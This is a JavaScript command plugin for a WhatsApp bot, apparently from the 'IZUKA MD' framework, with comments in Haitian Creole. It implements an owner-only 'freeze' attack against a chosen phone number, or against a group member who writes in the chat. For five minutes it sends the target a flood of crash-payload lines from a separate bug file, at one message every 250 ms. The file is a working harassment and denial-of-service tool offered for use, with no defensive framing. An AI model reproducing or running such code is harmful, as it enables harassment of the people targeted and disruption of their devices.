const { cmd } = require('../command');
const config = require('../config');
const bugchat = require('../bug/izuka5.js'); // ✅ verifye path la kòrèk

cmd({
  pattern: 'freeze',
  desc: 'Owner only command to send freeze attack messages',
  category: 'bug',
  react: '❄️',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX || '.';
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [
      botNumber,
      config.OWNER_NUMBER + '@s.whatsapp.net',
      ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')
    ];
    const protectedNumbers = ['13058962443']; // Numbers ki pa dwe atake

    const body = m.body || '';
    const cmdName = body.startsWith(prefix)
      ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
      : '';
    if (cmdName !== 'freeze') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, {
        text: '*🚫 This command is for owner only.*'
      }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    let targetNumber;

    if (m.isGroup) {
      // Si nan group, vize moun ki voye mesaj la
      targetNumber = senderId.split('@')[0];
    } else if (args.length > 0 && !isNaN(args[0])) {
      targetNumber = args[0];
    }

    if (!targetNumber) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}freeze <number>\nOu ka itilize l nan group pou vize moun nan tou.`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected and cannot be targeted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;

    await bot.sendMessage(from, {
      text: `❄️ *FREEZE ATTACK LAUNCHING*\n📲 Target: +${targetNumber}\n🕒 Duration: 5 minutes`
    }, { quoted: mek });

    const lines = bugchat.split('\n').filter(Boolean);
    const startTime = Date.now();
    let count = 0;

    while (Date.now() - startTime < 5 * 60 * 1000) { // 5 minit
      for (let line of lines) {
        await bot.sendMessage(targetJid, {
          text: `☃️ *FREEZE ATTACK #${++count}*\n${line}\n\n_⚠️ SYSTEM FREEZE INITIATED_\n~IZUKA MD~`
        });
        await new Promise(resolve => setTimeout(resolve, 250));
      }
    }

    await bot.sendMessage(targetJid, {
      text: `✅ *FREEZE COMPLETED*\n🧊 Total Payloads Sent: ${count}\n~IZUKA MD~`
    });

    await bot.sendMessage(from, {
      text: `✅ *FREEZE attack finished*\n🕔 Ran for 5 minutes\n📤 Messages sent: ${count}\n🎯 Target: +${targetNumber}`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
